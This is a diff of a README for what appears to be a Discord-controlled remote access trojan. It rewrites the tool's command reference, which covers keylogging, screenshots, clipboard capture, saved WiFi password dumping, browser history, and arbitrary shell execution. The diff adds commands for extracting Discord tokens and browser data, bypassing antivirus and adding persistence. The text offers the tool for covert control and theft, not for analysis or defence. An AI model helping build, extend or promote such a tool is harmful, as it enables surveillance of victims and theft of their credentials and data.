@@ -75,40 +75,41 @@ File extension can be modified to:
 ```
  ## 📜 Full Command Reference
 
-    commands_list = [
-        ('!screen', 'Capture and send a screenshot'),
-        ('!ip', 'Get the IP address'),
-        ('!clipboard', 'Show clipboard content'),
-        ('!exec <command>', 'Run a shell command'),
-        ('!shutdown', 'Shutdown the computer'),
-        ('!bsod', 'Trigger a BSOD (WARNING)'),
-        ('!msg <message>', 'Show a Windows message box'),
-        ('!url <url>', 'Open a URL in browser'),
-        ('!restart', 'Restart the computer'),
-        ('!cancelrestart', 'Cancel a scheduled restart'),
-        ('!log', 'Start keylogging (sends every 15s)'),
-        ('!stoplog', 'Stop keylogging'),
-        ('!ls', 'List files in the current directory'),
-        ('!cd <path>', 'Change the current directory'),
-        ('!rm <filename>', 'Delete a file'),
-        ('!rmd <dirname>', 'Delete a directory'),
-        ('!download <filename>', 'Download a file'),
-        ('!uuid', 'Get the system UUID'),
-        ('!mac', 'Get MAC addresses'),
-        ('!dns', 'Get DNS server info'),
-        ('!wifi', 'Show connected WiFi info'),
-        ('!wifi_passwords', 'Show saved WiFi passwords'),
-        ('!systeminfo', 'Show system information'),
-        ('!cpu', 'Show CPU information'),
-        ('!gpu', 'Show GPU information'),
-        ('!ram', 'Show RAM information in GB'),
-        ('!drives', 'Show drives information in GB'),
-        ('!hostname', 'Show the hostname'),
-        ('!osinfo', 'Show OS version'),
-        ('!user', 'Show current user'),
-        ('!recent [browser]', 'Show recently visited websites'),
-        ('!su', 'Request administrator privileges')
-    ]
+**Available Commands:**
+**System Commands:**
+!screen - Capture screenshot
+!ip - Get IP address
+!clipboard - Show clipboard content
+!exec <command> - Run shell command
+!shutdown - Shutdown computer
+!restart - Restart computer
+!bsod - Trigger BSOD (WARNING)
+
+**File Operations:**
+!ls - List files
+!cd <path> - Change directory
+!download <file> - Download file
+!rm <file> - Delete file
+
+**Information Gathering:**
+!systeminfo - System information
+!cpu - CPU info
+!gpu - GPU info
+!ram - RAM info
+!wifi_passwords - Show WiFi passwords
+!recent [browser] - Browser history
+!discord - Extract Discord tokens
+!browsers - Extract browser data
+
+**Other:**
+!msg <message> - Show message box
+!url <url> - Open URL
+!log - Start keylogging
+!stoplog - Stop keylogging
+!su - Request admin privileges
+!avbypass - Bypass antivirus
+!persist - Add persistence
+
 
 ## 🛠 Discord Bot Setup Guide
 1. Create a Discord Application
